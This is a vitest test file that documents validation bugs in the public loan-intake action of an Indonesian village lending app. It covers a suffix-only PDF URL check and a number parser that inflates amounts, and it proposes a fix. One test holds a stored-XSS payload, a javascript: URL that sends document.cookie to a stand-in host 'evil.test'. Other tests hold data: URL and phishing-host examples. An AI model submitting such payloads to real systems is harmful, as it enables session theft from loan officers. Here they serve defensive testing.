import { describe, expect, it } from "vitest";
import { readSource } from "../helpers/source-tree";

const ACTION = "src/app/ajukan-pinjaman/[slug]/[token]/actions.ts";

/**
 * The public loan-intake action validates its inputs with two inline helpers.
 * Neither is exported, so these tests mirror them verbatim and assert the
 * source still matches — if the action is fixed, the mirror assertion fails
 * and points here.
 *
 * This form is reachable by anyone holding a village's public link.
 */

// --- mirror of the document check in submitPublicLoanApplication ---
function documentPassesValidation(url: string, name: string) {
  return url.toLowerCase().endsWith(".pdf") && name.toLowerCase().endsWith(".pdf");
}

// --- mirror of toNumber() ---
function toNumber(value: string) {
  const raw = value.replace(/\./g, "").replace(/,/g, ".").trim();
  const numberValue = Number(raw);
  return Number.isFinite(numberValue) ? numberValue : 0;
}

describe("supporting document URL validation", () => {
  it("still validates by filename suffix only", () => {
    const source = readSource(ACTION);
    expect(source).toMatch(/toLowerCase\(\)\.endsWith\(["']\.pdf["']\)/);
    // No scheme/protocol check anywhere in the action.
    expect(source).not.toMatch(/new URL\(|startsWith\(["']https/);
  });

  it("accepts a genuine PDF link", () => {
    expect(
      documentPassesValidation("https://desa.example.id/a.pdf", "a.pdf"),
    ).toBe(true);
  });

  it("rejects a non-PDF", () => {
    expect(
      documentPassesValidation("https://desa.example.id/a.exe", "a.exe"),
    ).toBe(false);
  });

  it("BUG: accepts a javascript: URL that merely ends in .pdf", () => {
    // The stored value is rendered straight into href={application.supporting_document_url}
    // on the officer's review page (simpan-pinjam/pengajuan/page.tsx:241 and :482).
    const payload = "javascript:fetch('https://evil.test/'+document.cookie)//x.pdf";
    expect(documentPassesValidation(payload, "x.pdf")).toBe(true);
  });

  it("BUG: accepts a data: URL that ends in .pdf", () => {
    expect(
      documentPassesValidation("data:text/html;base64,PHN2Zz4=#x.pdf", "x.pdf"),
    ).toBe(true);
  });

  it("BUG: accepts an arbitrary attacker-controlled host", () => {
    // Rendered as an official-looking "Lihat Dokumen PDF" button in the dashboard.
    expect(
      documentPassesValidation("https://phishing.test/login.pdf", "doc.pdf"),
    ).toBe(true);
  });

  it("suggested fix: only http(s) URLs should pass", () => {
    function fixed(url: string, name: string) {
      if (!documentPassesValidation(url, name)) return false;
      try {
        return ["http:", "https:"].includes(new URL(url).protocol);
      } catch {
        return false;
      }
    }

    expect(fixed("https://desa.example.id/a.pdf", "a.pdf")).toBe(true);
    expect(fixed("javascript:alert(1)//x.pdf", "x.pdf")).toBe(false);
    expect(fixed("data:text/html,x#x.pdf", "x.pdf")).toBe(false);
  });
});

describe("Indonesian number parsing", () => {
  it("still strips dots then swaps commas for dots", () => {
    expect(readSource(ACTION)).toMatch(
      /replace\(\/\\\.\/g, ""\)\.replace\(\/,\/g, "\."\)/,
    );
  });

  it("reads Indonesian thousands separators correctly", () => {
    expect(toNumber("20.000.000")).toBe(20_000_000);
    expect(toNumber("20000000")).toBe(20_000_000);
  });

  it("reads an Indonesian decimal comma correctly", () => {
    expect(toNumber("1.500,50")).toBe(1500.5);
  });

  it("safely rejects English thousands separators as zero", () => {
    // "1,500,000" -> "1.500.000" -> NaN -> 0, which the caller rejects
    // with 'Nilai pinjaman wajib lebih besar dari nol'. Not silent.
    expect(toNumber("1,500,000")).toBe(0);
  });

  it("BUG: an English decimal point inflates the amount 100x", () => {
    // A pasted "20000000.50" becomes Rp 2.000.000.050 instead of Rp 20.000.000,50.
    // The field is free text (inputMode="numeric"), so this is reachable.
    expect(toNumber("20000000.50")).toBe(2_000_000_050);
    expect(toNumber("20000000.50")).not.toBe(20_000_000.5);
  });

  it("BUG: accepts scientific notation and negative-looking input", () => {
    expect(toNumber("1e9")).toBe(1_000_000_000);
    // Caller only checks `<= 0`, so Infinity would pass every guard.
    expect(toNumber("Infinity")).toBe(0); // Number.isFinite saves this one
  });
});
